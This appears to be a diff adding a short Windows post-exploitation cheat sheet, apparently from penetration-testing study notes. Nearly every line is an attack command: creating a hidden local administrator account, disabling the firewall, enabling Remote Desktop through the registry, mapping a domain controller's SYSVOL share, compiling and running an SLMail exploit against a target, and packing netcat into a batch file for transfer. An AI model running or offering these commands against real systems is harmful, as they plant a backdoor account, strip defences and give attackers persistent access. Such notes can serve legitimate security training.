@@ -1,0 +1,22 @@
+// if you need to add a user:
+net user ryan mwcb /add
+
+// add user to local administrators
+net localgroup administrators /add ryan
+
+// if need remove firewall:
+netsh firewall set opmode disable
+
+// enabled remote desktop
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+// map share to drive letter (group policy config location)
+net use z: \\dc01\SYSVOL
+
+// not really windows, but here are a few things to use when compiling for windows and running with wine
+i586-mingw32msvc-gcc slmail-win-fixed.c -lws2_32 -o s.exe
+wine s.exe TARGET
+
+// transferring via debug
+upx -9 nc.exe #located in /usr/share/windows-binaries
+wine exe2bat.exe nc.exe nc.txt
